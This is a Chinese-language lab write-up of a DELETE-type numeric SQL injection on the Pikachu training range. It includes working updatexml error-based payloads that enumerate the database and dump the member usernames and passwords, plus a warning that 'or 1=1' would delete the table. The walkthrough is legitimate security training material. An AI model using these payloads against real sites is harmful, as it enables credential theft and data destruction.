---
title: Pikachu delete注入实验报告
date: 2026-10-30
category: Web安全
tags: [SQL注入, delete注入, 报错注入, burp抓包, Pikachu]
---
## 一、实验环境

靶场：Pikachu 漏洞练习平台
地址：127.0.0.1/pikachu/vul/sqli/sqli_del.php
漏洞类型：DELETE 型SQL注入（数字型）

## 二、漏洞原理

留言板删除功能底层SQL：
DELETE FROM message WHERE id=$id;
重点：id是数字型参数，没有单引号包裹。
前端是AJAX异步删除，点击删除不会刷新页面、不会改变浏览器地址栏，所以不能直接改url注入，必须抓包修改请求。
DELETE属于DML删除语句，不能使用union select，使用updatexml报错注入读取数据。
## 三、实验步骤

1. 新增留言
在留言输入框输入内容，点击submit，生成一条留言，保留这条留言，先不要点删除。

2. Burp开启拦截
打开Burp Suite，开启Intercept: on，代理抓包。

3. 点击删除，捕获数据包
页面点击这条留言的【删除】，Burp捕获GET请求包，原始包类似：
GET /pikachu/vul/sqli/sqli_del.php?id=1 HTTP/1.1
Host: 127.0.0.1
...
4. 修改id参数，注入payload
在Burp里面修改id的值，放行数据包，在Response响应包里面查看报错信息（浏览器页面不会变化，属于正常现象）

Payload依次使用

1. 查询数据库名
1 and updatexml(1,concat(0x7e,database(),0x7e),1)
响应报错得到：~pikachu~

2. 查询当前库所有表
1 and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)
得到表：httpinfo,member,message,users,xssblind

3. 查询member表字段
1 and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='member'),0x7e),1)
得到字段：id,username,pw,sex,phonenum,address,email

4. 脱库，读取账号密码
1 and updatexml(1,concat(0x7e,(select group_concat(username,0x3a,pw) from member),0x7e),1)
0x3a 是冒号:，用来分隔用户名和密码
四、实验风险说明（非常重要）

❌ 禁止使用 id=1 or 1=1
or 1=1 会让where条件恒成立，SQL变成：
DELETE FROM message WHERE 1=1;
会直接清空message整张留言表，靶场数据全部删除。
✅ 只能用 and 拼接payload，保证只匹配当前这条id记录。

## 五、漏洞危害

1. 攻击者利用报错注入读取数据库敏感信息（账号、密码、邮箱等）；

2. 恶意构造or 1=1可以删除整张表数据，造成数据丢失；

3. 高权限情况下可读取服务器文件、写入webshell。

